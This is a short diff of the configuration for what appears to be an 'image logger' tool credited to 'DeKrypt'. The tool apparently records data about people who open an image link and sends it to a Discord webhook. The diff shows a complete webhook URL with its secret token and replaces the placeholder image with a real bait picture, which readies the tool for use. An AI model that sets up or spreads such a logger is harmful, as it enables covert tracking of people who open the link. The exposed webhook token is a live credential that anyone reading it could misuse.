@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1192113766750502932/N8tbEeBcTztezvIA61eAtpvCDAd28C3yA-Wl5r-OtkwUe_xulml1dTcXJmhLsQ3OpoWg",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.trendhunterstatic.com/phpthumbnails/36/36636/36636_1_600.jpeg?auto=webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
